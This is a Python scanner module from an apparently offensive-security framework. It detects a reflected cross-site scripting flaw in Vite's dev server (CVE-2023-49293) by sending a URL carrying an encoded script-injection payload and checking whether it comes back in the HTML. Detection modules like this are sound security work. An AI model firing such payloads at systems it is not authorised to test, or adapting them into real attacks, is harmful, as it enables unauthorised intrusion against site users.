#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Vite's dev server, when used with `appType: 'custom'` and manually invoking `server."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Vite dev server - Cross-Site Scripting Detection',
        'description': 'Vite\'s dev server, when used with `appType: \'custom\'` and manually invoking `server.transformIndexHtml` using the unmodified request URL, is vulnerable to XSS via a crafted URL payload. If the HTML being served includes an inline module script (`<script type="module">...</script>`), an attacker can inject a script via the URL, potentially leading to XSS in the browser. The vulnerability only affects certain custom SSR/dev configurations, not plain `vite dev`.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'vite', 'xss'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/vitejs/vite/security/advisories/GHSA-92r3-m2mg-pj97',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-49293',
        ],
        'cve': 'CVE-2023-49293',
    }

    def run(self):
        path = '/?%22%3E%3C/script%3E%3Cscript%3Ealert(document.domain)%3C/script%3E '
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        content_type = r.headers.get("Content-Type") or r.headers.get("content-type") or ""
        body_any = ('src="/@id/__x00__/?"></script><script>alert(document.domain)</script>',)
        ctype_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in content_type for m in ctype_any)):
            self.set_info(
                severity='medium',
                reason='Vite dev server - Cross-Site Scripting detected',
                path=path,
            )
            return True
        return False

